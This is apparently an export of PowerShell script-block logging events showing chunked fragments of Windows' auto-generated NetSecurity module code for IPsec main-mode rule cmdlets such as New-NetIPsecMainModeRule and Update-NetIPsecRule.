        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MainModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MainModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('MainModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetMainModeRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetMainModeRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetMainModeRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeCryptoSet') -and (@('ByAssociatedNetIPsecMainModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeCryptoSet}, 'MSFT_NetMainModeRuleMMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessi

ScriptBlock ID: 4cfc0bc4-892a-446d-8c97-3f4fcceb24f0
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 9):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetMainModeRule'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetIPsecMainModeRule
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('ID')]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [string]
    ${DisplayName},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Group},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled]
    ${Enabled},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profile},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${Platform},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${MainModeCryptoSet},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${LocalAddress},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string[]]
    ${RemoteAddress},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisplayName')) {
          [object]$__cmdletization_value = ${DisplayName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Description')) {
          [object]$__cmdletization_value = ${Description}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Group')) {
          [object]$__cmdletization_value = ${Group}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Enabled')) {
          [object]$__cmdletization_value = ${Enabled}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Profile')) {
          [object]$__cmdletization_value = ${Profile}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Platform')) {
          [object]$__cmdletization_value = ${Platform}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MainModeCryptoSet')) {
          [object]$__cmdletization_value = ${MainModeCryptoSet}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MainModeCryptoSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MainModeCryptoSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Phase1AuthSet')) {
          [object]$__cmdletization_value = ${Phase1AuthSet}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase1AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Phase1AuthSet'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('LocalAddress')) {
          [object]$__cmdletization_value = ${LocalAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RemoteAddress')) {
          [object]$__cmdletization_value = ${RemoteAddress}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletizatio

ScriptBlock ID: 4cfc0bc4-892a-446d-8c97-3f4fcceb24f0
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (23 of 23):
methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SyncPolicyDelta', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $false
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Sync-NetIPsecRule' -Alias '*'
        

function Update-NetIPsecRule
{
    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance[]])]
    param(
    
    [Parameter(ParameterSetName='Query (cdxml)', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [ValidateNotNull()]
    [string[]]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='Query (cdxml)', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.ChangeAction]
    ${Action},

    [Parameter(ParameterSetName='Query (cdxml)', ValueFromPipelineByPropertyName=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', ValueFromPipelineByPropertyName=$true)]
    [string[]]
    ${IPv6Addresses},

    [Parameter(ParameterSetName='Query (cdxml)', ValueFromPipelineByPropertyName=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', ValueFromPipelineByPropertyName=$true)]
    [string[]]
    ${IPv4Addresses},

    [Parameter(ParameterSetName='Query (cdxml)', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.EndpointType]
    ${EndpointType},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('IPsecRuleName') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${IPsecRuleName})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Action')) {
            [object]$__cmdletization_value = ${Action}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.ChangeAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.ChangeAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IPv6Addresses')) {
            [object]$__cmdletization_value = ${IPv6Addresses}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6Addresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6Addresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('IPv4Addresses')) {
            [object]$__cmdletization_value = ${IPv4Addresses}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4Addresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4Addresses'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('EndpointType')) {
            [object]$__cmdletization_value = ${EndpointType}
